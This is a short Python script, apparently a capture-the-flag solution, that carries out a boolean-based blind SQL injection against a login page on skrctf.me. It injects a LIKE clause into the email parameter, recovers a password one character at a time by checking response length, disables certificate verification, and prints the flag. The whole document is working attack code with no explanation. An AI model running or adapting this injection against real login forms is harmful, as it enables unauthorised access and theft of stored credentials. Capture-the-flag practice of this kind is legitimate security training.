import requests
import string
requests.packages.urllib3.disable_warnings()

headers = {
    'Host': 'skrctf.me',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Upgrade-Insecure-Requests': '1',
    'Te': 'trailers',
    'Connection': 'close',
}
password = ""
for ranges in range(11):
	for i in string.ascii_lowercase:
		temp = password + i
		params = (
		    ('email', "godam@kuki.com' and password like '"+temp+"%'-- "),
		    ('password', "'--"),
		)

		response = requests.get('https://skrctf.me/ports/4000/index.php', headers=headers, params=params, verify=False)
#		print(len(response.text))
		if len(response.text) > 1700:
			password += i
			break
	print("Round ["+str(ranges+1)+"]")
	print(password)

print("Flag => SKR{"+password+"}")
